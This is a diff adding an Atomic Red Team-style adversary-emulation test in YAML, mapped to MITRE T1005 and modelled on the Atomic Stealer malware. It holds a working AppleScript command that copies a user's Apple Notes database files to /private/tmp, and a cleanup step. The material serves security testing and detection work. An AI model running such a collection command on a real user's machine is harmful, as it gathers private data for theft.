@@ -1,0 +1,39 @@
+- id: cfb6d400-a269-4c06-a347-6d88d584d5f7
+  name: Copy Apple Notes database files using AppleScript
+  description: This command will copy Apple Notes database files using AppleScript
+    as seen in Atomic Stealer.
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    darwin:
+      sh:
+        command: osascript -e 'tell application "Finder"' -e 'set destinationFolderPath
+          to POSIX file "/private/tmp"' -e 'set notesFolderPath to (path to home folder
+          as text) & "Library:Group Containers:group.com.apple.notes:"' -e 'set notesFolder
+          to folder notesFolderPath' -e 'set notesFiles to {file "NoteStore.sqlite",
+          file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder'
+          -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath
+          with replacing' -e 'end' -e 'end tell'
+        cleanup: rm "#{destination_path}/NoteStore.sqlite*"
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1005
+  - atomic-red-team
+  - collection
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      destination_path:
+        description: Specify the path to copy the database files into.
+        type: path
+        default: /private/tmp
+    technique_created: '2017-05-31T21:30:20.537Z'
+    atomic_guid: cfb6d400-a269-4c06-a347-6d88d584d5f7
+    import_timestamp: '2025-06-24T11:14:07.618112Z'
